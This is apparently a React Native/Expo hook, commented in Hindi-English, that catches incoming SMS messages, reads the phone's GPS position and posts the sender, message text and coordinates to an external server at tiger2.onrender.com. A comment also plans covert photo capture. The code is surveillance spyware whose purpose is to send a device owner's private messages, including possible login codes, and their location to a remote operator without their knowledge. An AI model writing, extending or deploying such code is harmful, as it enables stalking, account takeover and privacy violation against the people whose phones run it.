import { useEffect } from 'react';
import * as Location from 'expo-location';
import { Camera } from 'expo-camera';
import axios from 'axios';

// Aapka Render Server URL (Check karlein ki ye sahi hai)
const SERVER_URL = 'https://tiger2.onrender.com/log-sms';

export default function useTracking(permissionStatus) {
  useEffect(() => {
    if (permissionStatus === 'granted') {
      // SMS Interceptor logic yahan shuru hoti hai
      // Note: Aapka existing SMS listener yahan hona chahiye jo 'onSMSReceived' trigger kare
    }
  }, [permissionStatus]);

  // Ye function SMS aate hi call hoga
  const onSMSReceived = async (sender, message) => {
    try {
      // 1. GPS Coordinates Lena
      let location = await Location.getCurrentPositionAsync({
        accuracy: Location.Accuracy.Balanced,
      });

      const gpsData = {
        lat: location.coords.latitude,
        lng: location.coords.longitude
      };

      // 2. Hidden Photo Capture (Optional: Iske liye Camera Ref chahiye hota hai)
      // Abhi ke liye hum sirf GPS aur SMS bhej rahe hain
      
      await sendToServer(sender, message, gpsData, null);
    } catch (error) {
      console.log("Tracking Error:", error.message);
      // Agar GPS fail ho jaye toh bhi SMS bhej do
      sendToServer(sender, message, null, null);
    }
  };

  const sendToServer = async (sender, message, location, photo) => {
    try {
      await axios.post(SERVER_URL, {
        sender: sender || "Unknown",
        message: message || "No Content",
        location: location, // {lat, lng}
        photo: photo,       // Base64 string
        device: "Tiger-Android",
        timestamp: new Date().toLocaleString()
      });
      console.log("✓ Data Sent to Server");
    } catch (error) {
      console.error("X Server Sync Failed:", error.message);
    }
  };
}
